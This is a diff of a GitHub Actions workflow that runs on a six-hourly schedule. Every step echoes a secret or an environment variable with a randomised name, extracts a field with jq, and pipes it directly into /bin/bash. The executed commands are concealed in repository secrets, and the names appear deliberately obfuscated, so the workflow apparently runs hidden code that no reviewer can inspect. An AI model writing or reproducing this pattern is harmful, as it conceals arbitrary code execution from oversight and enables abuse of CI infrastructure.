@@ -1,29 +1,22 @@
 name: yanqing19871010
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 0/6 * * *'
-
+    - cron: '46 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yanqing19871010
         env:
-          ubqpk906: ${{ secrets.ubqpk906 }}
+          sbm55: ${{ secrets.sbm55 }}
         run: |
-          echo $ubqpk906 | jq -r .he32702 | /bin/bash
-          echo $u47 | jq -r .kr14 | /bin/bash
-          echo $i0002 | jq -r .f38093 | /bin/bash
-          echo $o81911 | jq -r .ggaj7 | /bin/bash
-          echo $faaqd55002 | jq -r .orpso2041 | /bin/bash
-          echo $gp3 | jq -r .rsf9955 | /bin/bash
-          echo $egk0 | jq -r .bksm5089 | /bin/bash
-          echo $ladv193 | jq -r .ovcb9 | /bin/bash
-          echo $tryw857 | jq -r .aq1 | /bin/bash
-          echo $qed588 | jq -r .a5 | /bin/bash
-          echo $v96425 | jq -r .fiq82 | /bin/bash
-          echo $bf28318 | jq -r .nt7737 | /bin/bash
+          echo $sbm55 | jq -r .uyah3 | /bin/bash
+          echo $z5 | jq -r .opd38919 | /bin/bash
+          echo $sdj394 | jq -r .mkh91 | /bin/bash
+          echo $hf232 | jq -r .gb94 | /bin/bash
+          echo $n03 | jq -r .e9511 | /bin/bash
+          echo $cz308 | jq -r .m89312 | /bin/bash
 
